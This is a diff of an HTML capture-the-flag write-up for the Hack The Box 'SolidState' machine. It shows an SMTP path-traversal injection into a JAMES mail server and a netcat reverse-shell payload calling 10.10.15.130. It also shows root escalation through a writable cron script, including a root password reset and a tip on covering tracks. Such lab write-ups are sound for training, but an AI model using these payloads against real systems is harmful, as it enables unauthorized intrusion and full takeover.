+</span></span><span style="display:flex;"><span>250-solidstate Hello someone@mydomain (10.10.15.130 [10.10.15.130])
+</span></span><span style="display:flex;"><span>250-PIPELINING
+</span></span><span style="display:flex;"><span>250 ENHANCEDSTATUSCODES
+</span></span><span style="display:flex;"><span>MAIL FROM: &lt;&#39;@mydomain&gt;
+</span></span><span style="display:flex;"><span>250 2.1.0 Sender &lt;&#39;@mydomain&gt; OK
+</span></span><span style="display:flex;"><span>RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
+</span></span><span style="display:flex;"><span>250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
+</span></span><span style="display:flex;"><span>DATA
+</span></span><span style="display:flex;"><span>354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
+</span></span><span style="display:flex;"><span>FROM: someone@mydomain
+</span></span><span style="display:flex;"><span>&#39;
+</span></span><span style="display:flex;"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>250 2.6.0 Message received
+</span></span><span style="display:flex;"><span>quit
+</span></span><span style="display:flex;"><span>221 2.0.0 solidstate Service closing transmission channel
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span></code></pre></div><p>Now run <code>nc -lnvp 1234</code> locally and then <code>ssh mindy@10.10.10.51</code> to trigger the payload.
 You should catch the shell!
 On the host, you can then inspect the file James created to understand how it worked.
 You should also consider deleting it to cover your tracks and to not spoil the experience for others doing the box ;)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">cat /etc/bash_completion.d/4D61696C313531373137393430333938342D30.Repository.FileStreamStore
-Return-Path: &lt;&#39;@mydomain&gt;
-Message-ID: &lt;570018.0.1517179404013.JavaMail.root@solidstate&gt;
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
-Received: from 10.10.15.130 ([10.10.15.130])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 597
-          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;
-          Sun, 28 Jan 2018 17:43:23 -0500 (EST)
-Date: Sun, 28 Jan 2018 17:43:23 -0500 (EST)
-FROM: someone@mydomain
-&#39;
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f
-<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h1 id="privesc">Privesc</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>cat /etc/bash_completion.d/4D61696C313531373137393430333938342D30.Repository.FileStreamStore
+</span></span><span style="display:flex;"><span>Return-Path: &lt;&#39;@mydomain&gt;
+</span></span><span style="display:flex;"><span>Message-ID: &lt;570018.0.1517179404013.JavaMail.root@solidstate&gt;
+</span></span><span style="display:flex;"><span>MIME-Version: 1.0
+</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset=us-ascii
+</span></span><span style="display:flex;"><span>Content-Transfer-Encoding: 7bit
+</span></span><span style="display:flex;"><span>Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
+</span></span><span style="display:flex;"><span>Received: from 10.10.15.130 ([10.10.15.130])
+</span></span><span style="display:flex;"><span>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 597
+</span></span><span style="display:flex;"><span>          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;
+</span></span><span style="display:flex;"><span>          Sun, 28 Jan 2018 17:43:23 -0500 (EST)
+</span></span><span style="display:flex;"><span>Date: Sun, 28 Jan 2018 17:43:23 -0500 (EST)
+</span></span><span style="display:flex;"><span>FROM: someone@mydomain
+</span></span><span style="display:flex;"><span>&#39;
+</span></span><span style="display:flex;"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f
+</span></span></code></pre></div><h1 id="privesc">Privesc</h1>
 <p>The privesc is a pretty easy one.
 Just look for files owned by root that we could write to.
 To reduce false positives, only look for files (not symlinks) and exclude proc, which is full of root-owned writable files.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">find / -user root -perm -002 -type f -not -path &#34;/proc/*&#34;  2&gt;/dev/null
-/opt/tmp.py
-/sys/fs/cgroup/memory/cgroup.event_control
-</code></pre></div><p>The file <code>/opt/tmp/py</code> looks interesting.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>find / -user root -perm -002 -type f -not -path &#34;/proc/*&#34;  2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/opt/tmp.py
+</span></span><span style="display:flex;"><span>/sys/fs/cgroup/memory/cgroup.event_control
+</span></span></code></pre></div><p>The file <code>/opt/tmp/py</code> looks interesting.
 Have a look at it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">cat /opt/tmp.py
-#!/usr/bin/env python
-import os
-import sys
-try:
-     os.system(&#39;rm -r /tmp/* &#39;)
-except:
-     sys.exit()
-</code></pre></div><p>A simple script that just deletes everything in the tmp directory.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>cat /opt/tmp.py
+</span></span><span style="display:flex;"><span>#!/usr/bin/env python
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import sys
+</span></span><span style="display:flex;"><span>try:
+</span></span><span style="display:flex;"><span>     os.system(&#39;rm -r /tmp/* &#39;)
+</span></span><span style="display:flex;"><span>except:
+</span></span><span style="display:flex;"><span>     sys.exit()
+</span></span></code></pre></div><p>A simple script that just deletes everything in the tmp directory.
 If it is owned by root, maybe root is calling it sometimes.
 Inspecting the cronjob configs in <code>/etc</code>, we can&rsquo;t find any evidence the script runs.
 Nevertheless, it could also be configured in root&rsquo;s private cronfile <code>/var/spool/cron/crontabs/root</code>.
@@ -683,32 +682,32 @@ Here comes the short version:</p>
 <p>With the new command put in place of the old one, we cannot observe <code>/dev/shm</code> to see if the file appears in it.
 And indeed, after a few minutes, it will appear.
 As you can see, it is owned by root, meaning that root ran the script.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">$<span style="color:#f92672">{</span>debian_chroot:+<span style="color:#f92672">(</span>$debian_chroot<span style="color:#f92672">)}</span>mindy@solidstate:~$ ls -lah /dev/shm/
-total 4.0K
-drwxrwxrwt  2 root root   60 Jan 27 18:54 .
-drwxr-xr-x 17 root root 3.0K Jan 27 17:19 ..
--rw-r--r--  1 root root   13 Jan 27 18:54 .tmp.txt
-</code></pre></div><p>Since it all works as expected, we can easily get the flag now.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>debian_chroot:+<span style="color:#f92672">(</span>$debian_chroot<span style="color:#f92672">)}</span>mindy@solidstate:~$ ls -lah /dev/shm/
+</span></span><span style="display:flex;"><span>total 4.0K
+</span></span><span style="display:flex;"><span>drwxrwxrwt  2 root root   60 Jan 27 18:54 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 17 root root 3.0K Jan 27 17:19 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  1 root root   13 Jan 27 18:54 .tmp.txt
+</span></span></code></pre></div><p>Since it all works as expected, we can easily get the flag now.
 Change the script to execute to read the flag and put it into a new file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">#!/usr/bin/env python
-import os
-import sys
-try:
-     os.system(&#39;cat /root/root.txt &gt; /dev/shm/flag.txt&#39;)
-except:
-     sys.exit()
-</code></pre></div><p>To not just print the flag but get real access, you can use for example either of the following lines:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>#!/usr/bin/env python
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import sys
+</span></span><span style="display:flex;"><span>try:
+</span></span><span style="display:flex;"><span>     os.system(&#39;cat /root/root.txt &gt; /dev/shm/flag.txt&#39;)
+</span></span><span style="display:flex;"><span>except:
+</span></span><span style="display:flex;"><span>     sys.exit()
+</span></span></code></pre></div><p>To not just print the flag but get real access, you can use for example either of the following lines:</p>
 <ul>
 <li><code>echo root:password | /usr/sbin/chpasswd &amp;&amp; echo &quot;done&quot; &gt; /dev/shm/done.txt</code>: changes root password to &lsquo;password&rsquo;. You can log in afterwards with <code>su</code> from your current SSH session.</li>
 <li><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f</code>: get a new reverse shell. Catch with <code>nc -lnvp 1234</code> localcally.</li>
 </ul>
 <p>Once root, you can see that it is indeed root&rsquo;s crontab that runs the script every three minutes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@solidstate:/dev/shm# cat /var/spool/cron/crontabs/root
-# DO NOT EDIT THIS FILE - edit the master and reinstall.
-[...]
-# m h  dom mon dow   command
-*/3 * * * * python /opt/tmp.py
-</code></pre></div><h1 id="links">Links</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@solidstate:/dev/shm# cat /var/spool/cron/crontabs/root
+</span></span><span style="display:flex;"><span># DO NOT EDIT THIS FILE - edit the master and reinstall.
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span># m h  dom mon dow   command
+</span></span><span style="display:flex;"><span>*/3 * * * * python /opt/tmp.py
+</span></span></code></pre></div><h1 id="links">Links</h1>
 <p>Other write-ups for this box that I know of are the one by <a href="https://blog.mallardlabs.com/hackthebox-solidstate-writeup/">ELijah Seymour</a>, which contains a detailed walkthrough for the James exploit.
 There is also one by <a href="https://ratil.life/hack-the-box-solidstate/">Trevor Steen</a> who puts the Python pty code directly into the James exploit. It is a nice idea since every SSH login should directly give you a real shell then.
 Finally, check out the video walkthrough from <a href="https://www.youtube.com/watch?v=_QapCUx55Xk&amp;t">ippsec</a>, which is very nice to pick up the basic workflows.</p>
@@ -733,7 +732,7 @@ Finally, check out the video walkthrough from <a href="https://www.youtube.com/w
   
     and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
   
-  using <span itemprop="wordCount">2502</span> words.
+  using <span itemprop="wordCount">2464</span> words.
 </p>
 
       
@@ -744,7 +743,7 @@ Finally, check out the video walkthrough from <a href="https://www.youtube.com/w
     <ul>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="10M">10 minutes</time>
+        <time datetime="9M">9 minutes</time>
       
     </ul>
   </aside>
